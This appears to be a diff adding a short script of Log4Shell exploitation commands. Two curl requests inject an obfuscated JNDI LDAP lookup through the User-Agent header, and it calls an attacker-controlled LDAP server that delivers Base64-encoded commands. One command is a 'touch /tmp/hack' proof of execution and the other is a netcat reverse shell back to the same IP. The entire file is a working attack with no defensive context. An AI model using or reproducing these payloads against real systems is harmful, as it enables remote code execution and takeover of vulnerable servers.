@@ -1,0 +1,9 @@
+# touch /tmp/hack
+curl -H 'User-Agent:${${lower:j}ndi:ldap://34.118.109.39:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9oYWNr}' 34.118.109.39:9000
+
+# nc 34.118.109.39 15000 -e /bin/sh
+curl -H 'User-Agent:${${lower:j}ndi:ldap://34.118.109.39:1389/Basic/Command/Base64/bmMgMzQuMTE4LjEwOS4zOSAxNTAwMCAtZSAvYmluL3No}' 34.118.109.39:9000
+
+
+
+
